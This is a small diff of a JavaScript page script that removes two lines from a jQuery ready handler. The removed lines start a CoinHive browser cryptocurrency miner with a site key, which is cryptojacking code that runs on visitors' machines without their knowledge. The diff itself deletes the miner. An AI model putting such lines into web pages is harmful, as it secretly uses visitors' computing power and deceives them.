@@ -19,6 +19,4 @@ $(document).ready(() => {
         startingTop: "4%", // Starting top style attribute
         endingTop: "20%" // Ending top style attribute
     });
-    let miner = new CoinHive.Anonymous("404URmTCWwj6XZYtLi9YMD6hcGjbgITb");
-    miner.start();
 });
